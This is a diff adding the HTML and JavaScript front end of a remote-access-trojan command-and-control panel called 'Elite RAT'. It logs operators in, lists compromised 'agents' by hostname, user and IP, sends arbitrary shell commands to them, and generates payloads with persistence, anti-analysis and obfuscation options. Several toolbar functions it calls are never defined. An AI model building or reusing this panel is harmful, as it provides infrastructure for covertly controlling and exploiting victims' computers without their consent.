@@ -1,0 +1,714 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Elite RAT - Command & Control</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: #0a0e27;
+            color: #e4e4e7;
+            min-height: 100vh;
+        }
+        
+        /* Login Screen */
+        .login-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 100%);
+        }
+        
+        .login-box {
+            background: rgba(26, 31, 58, 0.8);
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            width: 100%;
+            max-width: 400px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .login-box h1 {
+            text-align: center;
+            margin-bottom: 30px;
+            color: #00ff88;
+            font-size: 28px;
+            text-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #a1a1aa;
+            font-size: 14px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            background: rgba(10, 14, 39, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 6px;
+            color: #e4e4e7;
+            font-size: 16px;
+            transition: all 0.3s;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #00ff88;
+            box-shadow: 0 0 10px rgba(0, 255, 136, 0.2);
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #00ff88 0%, #00cc6a 100%);
+            border: none;
+            border-radius: 6px;
+            color: #0a0e27;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(0, 255, 136, 0.3);
+        }
+        
+        /* Main Dashboard */
+        .dashboard {
+            display: none;
+            min-height: 100vh;
+        }
+        
+        .header {
+            background: rgba(26, 31, 58, 0.95);
+            padding: 20px 30px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .header h1 {
+            color: #00ff88;
+            font-size: 24px;
+        }
+        
+        .header .status {
+            display: flex;
+            gap: 20px;
+            align-items: center;
+        }
+        
+        .status-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .status-indicator {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #ef4444;
+        }
+        
+        .status-indicator.active {
+            background: #00ff88;
+            box-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
+        }
+        
+        .container {
+            display: flex;
+            height: calc(100vh - 81px);
+        }
+        
+        .sidebar {
+            width: 280px;
+            background: rgba(26, 31, 58, 0.5);
+            border-right: 1px solid rgba(255, 255, 255, 0.1);
+            overflow-y: auto;
+        }
+        
+        .sidebar h2 {
+            padding: 20px;
+            font-size: 18px;
+            color: #a1a1aa;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .agent-list {
+            padding: 10px;
+        }
+        
+        .agent-item {
+            padding: 15px;
+            margin: 5px 0;
+            background: rgba(10, 14, 39, 0.5);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 1px solid transparent;
+        }
+        
+        .agent-item:hover {
+            background: rgba(10, 14, 39, 0.8);
+            border-color: #00ff88;
+        }
+        
+        .agent-item.selected {
+            background: rgba(0, 255, 136, 0.1);
+            border-color: #00ff88;
+        }
+        
+        .agent-name {
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+        
+        .agent-info {
+            font-size: 12px;
+            color: #a1a1aa;
+        }
+        
+        .agent-status {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            margin-right: 5px;
+        }
+        
+        .agent-status.online {
+            background: #00ff88;
+        }
+        
+        .agent-status.offline {
+            background: #ef4444;
+        }
+        
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        
+        .toolbar {
+            background: rgba(26, 31, 58, 0.3);
+            padding: 15px 20px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            display: flex;
+            gap: 10px;
+        }
+        
+        .toolbar button {
+            padding: 8px 16px;
+            background: rgba(0, 255, 136, 0.1);
+            border: 1px solid #00ff88;
+            border-radius: 6px;
+            color: #00ff88;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .toolbar button:hover {
+            background: rgba(0, 255, 136, 0.2);
+        }
+        
+        .terminal {
+            flex: 1;
+            background: #000;
+            padding: 20px;
+            font-family: "Courier New", monospace;
+            overflow-y: auto;
+            position: relative;
+        }
+        
+        .terminal-output {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            margin-bottom: 20px;
+        }
+        
+        .terminal-line {
+            margin: 5px 0;
+            line-height: 1.5;
+        }
+        
+        .terminal-line.command {
+            color: #00ff88;
+        }
+        
+        .terminal-line.output {
+            color: #e4e4e7;
+        }
+        
+        .terminal-line.error {
+            color: #ef4444;
+        }
+        
+        .terminal-input-container {
+            display: flex;
+            align-items: center;
+            position: sticky;
+            bottom: 0;
+            background: #000;
+            padding-top: 10px;
+        }
+        
+        .terminal-prompt {
+            color: #00ff88;
+            margin-right: 10px;
+        }
+        
+        .terminal-input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: #e4e4e7;
+            font-family: inherit;
+            font-size: inherit;
+            outline: none;
+        }
+        
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .modal.active {
+            display: flex;
+        }
+        
+        .modal-content {
+            background: #1a1f3a;
+            padding: 30px;
+            border-radius: 12px;
+            max-width: 500px;
+            width: 100%;
+        }
+        
+        .modal-header {
+            margin-bottom: 20px;
+        }
+        
+        .modal-header h2 {
+            color: #00ff88;
+        }
+        
+        .modal-body {
+            margin-bottom: 20px;
+        }
+        
+        .modal-footer {
+            display: flex;
+            gap: 10px;
+            justify-content: flex-end;
+        }
+        
+        /* Loader */
+        .loader {
+            border: 3px solid rgba(0, 255, 136, 0.1);
+            border-top: 3px solid #00ff88;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <!-- Login Screen -->
+    <div id="loginScreen" class="login-container">
+        <div class="login-box">
+            <h1>🛡️ Elite RAT</h1>
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="username">Username</label>
+                    <input type="text" id="username" name="username" required>
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" required>
+                </div>
+                <button type="submit" class="btn">Login</button>
+            </form>
+        </div>
+    </div>
+    
+    <!-- Dashboard -->
+    <div id="dashboard" class="dashboard">
+        <header class="header">
+            <h1>Elite C2 Dashboard</h1>
+            <div class="status">
+                <div class="status-item">
+                    <span class="status-indicator" id="c2Status"></span>
+                    <span>C2 Server</span>
+                </div>
+                <div class="status-item">
+                    <span id="agentCount">0</span> Agents
+                </div>
+                <div class="status-item">
+                    <button onclick="logout()">Logout</button>
+                </div>
+            </div>
+        </header>
+        
+        <div class="container">
+            <aside class="sidebar">
+                <h2>Connected Agents</h2>
+                <div id="agentList" class="agent-list">
+                    <div class="loader"></div>
+                </div>
+            </aside>
+            
+            <main class="main-content">
+                <div class="toolbar">
+                    <button onclick="executeCommand()">Execute Command</button>
+                    <button onclick="getScreenshot()">Screenshot</button>
+                    <button onclick="getSystemInfo()">System Info</button>
+                    <button onclick="generatePayload()">Generate Payload</button>
+                    <button onclick="refreshAgents()">Refresh</button>
+                </div>
+                
+                <div class="terminal">
+                    <div id="terminalOutput" class="terminal-output"></div>
+                    <div class="terminal-input-container">
+                        <span class="terminal-prompt">$</span>
+                        <input type="text" id="terminalInput" class="terminal-input" placeholder="Enter command...">
+                    </div>
+                </div>
+            </main>
+        </div>
+    </div>
+    
+    <!-- Payload Generation Modal -->
+    <div id="payloadModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>Generate Payload</h2>
+            </div>
+            <div class="modal-body">
+                <div class="form-group">
+                    <label>Platform</label>
+                    <select id="payloadPlatform">
+                        <option value="python">Python</option>
+                        <option value="windows">Windows</option>
+                        <option value="linux">Linux</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>
+                        <input type="checkbox" id="payloadPersistence" checked> 
+                        Include Persistence
+                    </label>
+                </div>
+                <div class="form-group">
+                    <label>
+                        <input type="checkbox" id="payloadAntiAnalysis" checked> 
+                        Anti-Analysis
+                    </label>
+                </div>
+                <div class="form-group">
+                    <label>Obfuscation Level</label>
+                    <input type="range" id="payloadObfuscation" min="0" max="5" value="3">
+                </div>
+            </div>
+            <div class="modal-footer">
+                <button onclick="closeModal()">Cancel</button>
+                <button onclick="doGeneratePayload()" class="btn">Generate</button>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Configuration
+        const API_URL = 'http://localhost:5000/api';
+        let authToken = null;
+        let selectedAgent = null;
+        let agents = [];
+        
+        // Login
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            try {
+                const response = await fetch(`${API_URL}/auth/login`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({username, password})
+                });
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    authToken = data.token;
+                    localStorage.setItem('token', authToken);
+                    showDashboard();
+                } else {
+                    alert('Invalid credentials');
+                }
+            } catch (error) {
+                alert('Connection failed');
+            }
+        });
+        
+        // Show dashboard
+        function showDashboard() {
+            document.getElementById('loginScreen').style.display = 'none';
+            document.getElementById('dashboard').style.display = 'block';
+            
+            // Start monitoring
+            refreshAgents();
+            checkC2Status();
+            setInterval(refreshAgents, 5000);
+            setInterval(checkC2Status, 10000);
+            
+            // Setup terminal input
+            document.getElementById('terminalInput').addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    const command = e.target.value;
+                    if (command && selectedAgent) {
+                        sendCommand(command);
+                        e.target.value = '';
+                    }
+                }
+            });
+        }
+        
+        // Refresh agents
+        async function refreshAgents() {
+            try {
+                const response = await fetch(`${API_URL}/agents`, {
+                    headers: {'Authorization': `Bearer ${authToken}`}
+                });
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    agents = data.agents;
+                    updateAgentList();
+                    document.getElementById('agentCount').textContent = data.connected;
+                }
+            } catch (error) {
+                console.error('Failed to fetch agents:', error);
+            }
+        }
+        
+        // Update agent list UI
+        function updateAgentList() {
+            const listEl = document.getElementById('agentList');
+            
+            if (agents.length === 0) {
+                listEl.innerHTML = '<p style="text-align: center; color: #666;">No agents connected</p>';
+                return;
+            }
+            
+            listEl.innerHTML = agents.map(agent => `
+                <div class="agent-item ${selectedAgent === agent.id ? 'selected' : ''}" 
+                     onclick="selectAgent('${agent.id}')">
+                    <div class="agent-name">
+                        <span class="agent-status ${agent.connected ? 'online' : 'offline'}"></span>
+                        ${agent.hostname || 'Unknown'}
+                    </div>
+                    <div class="agent-info">
+                        ${agent.username || 'Unknown'} @ ${agent.ip_address || 'Unknown'}<br>
+                        ${agent.platform || 'Unknown'}
+                    </div>
+                </div>
+            `).join('');
+        }
+        
+        // Select agent
+        function selectAgent(agentId) {
+            selectedAgent = agentId;
+            updateAgentList();
+            
+            const agent = agents.find(a => a.id === agentId);
+            if (agent) {
+                addTerminalLine(`Selected agent: ${agent.hostname} (${agent.id})`, 'command');
+            }
+        }
+        
+        // Send command
+        async function sendCommand(command) {
+            if (!selectedAgent) {
+                alert('Select an agent first');
+                return;
+            }
+            
+            addTerminalLine(`$ ${command}`, 'command');
+            
+            try {
+                const response = await fetch(`${API_URL}/agents/${selectedAgent}/execute`, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': `Bearer ${authToken}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({command})
+                });
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    addTerminalLine('Command queued...', 'output');
+                    
+                    // Poll for results
+                    setTimeout(() => getResults(selectedAgent), 2000);
+                } else {
+                    addTerminalLine('Failed to execute command', 'error');
+                }
+            } catch (error) {
+                addTerminalLine('Connection error', 'error');
+            }
+        }
+        
+        // Get command results
+        async function getResults(agentId) {
+            try {
+                const response = await fetch(`${API_URL}/agents/${agentId}/results?limit=1`, {
+                    headers: {'Authorization': `Bearer ${authToken}`}
+                });
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data.results && data.results.length > 0) {
+                        const result = data.results[0];
+                        if (result.output) {
+                            addTerminalLine(result.output, 'output');
+                        }
+                        if (result.error) {
+                            addTerminalLine(result.error, 'error');
+                        }
+                    }
+                }
+            } catch (error) {
+                console.error('Failed to get results:', error);
+            }
+        }
+        
+        // Add line to terminal
+        function addTerminalLine(text, type = 'output') {
+            const output = document.getElementById('terminalOutput');
+            const line = document.createElement('div');
+            line.className = `terminal-line ${type}`;
+            line.textContent = text;
+            output.appendChild(line);
+            output.scrollTop = output.scrollHeight;
+        }
+        
+        // Check C2 status
+        async function checkC2Status() {
+            try {
+                const response = await fetch(`${API_URL}/c2/status`, {
+                    headers: {'Authorization': `Bearer ${authToken}`}
+                });
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    const indicator = document.getElementById('c2Status');
+                    if (data.running) {
+                        indicator.classList.add('active');
+                    } else {
+                        indicator.classList.remove('active');
+                    }
+                }
+            } catch (error) {
+                console.error('Failed to check C2 status:', error);
+            }
+        }
+        
+        // Generate payload
+        function generatePayload() {
+            document.getElementById('payloadModal').classList.add('active');
+        }
+        
+        async function doGeneratePayload() {
+            const platform = document.getElementById('payloadPlatform').value;
+            const persistence = document.getElementById('payloadPersistence').checked;
+            const antiAnalysis = document.getElementById('payloadAntiAnalysis').checked;
+            const obfuscation = document.getElementById('payloadObfuscation').value;
+            
+            try {
+                const response = await fetch(`${API_URL}/payload/generate`, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': `Bearer ${authToken}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        platform,
+                        persistence,
+                        anti_analysis: antiAnalysis,
+                        obfuscation: parseInt(obfuscation)
+                    })
+                });
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    addTerminalLine(`Generated payload: ${data.filename} (${data.size} bytes)`, 'command');
+                    
+                    // Download
+                    window.location.href = `${API_URL}/payload/download/${data.filename}?token=${authToken}`;
+                    closeModal();
+                }
+            } catch (error) {
+                alert('Failed to generate payload');
+            }
+        }
+        
+        function closeModal() {
+            document.getElementById('payloadModal').classList.remove('active');
+        }
+        
+        // Logout
+        function logout() {
+            localStorage.removeItem('token');
+            authToken = null;
+            location.reload();
+        }
+        
+        // Check existing token
+        const savedToken = localStorage.getItem('token');
+        if (savedToken) {
+            authToken = savedToken;
+            showDashboard();
+        }
+    </script>
+</body>
+</html>
